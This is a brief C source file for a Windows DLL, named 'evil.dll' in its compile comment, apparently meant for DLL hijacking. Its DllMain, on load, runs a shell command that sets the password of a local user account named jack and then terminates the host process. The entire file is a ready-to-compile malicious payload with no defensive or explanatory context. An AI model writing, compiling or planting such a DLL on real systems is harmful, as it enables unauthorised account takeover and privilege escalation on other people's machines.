#include <windows.h>

// Here so I remember how to compile it.
// x86_64-w64-mingw32-gcc -shared -o evil.dll evildll.c

BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        system("cmd.exe /k net user jack Password11");
        ExitProcess(0);
    }
    return TRUE;
}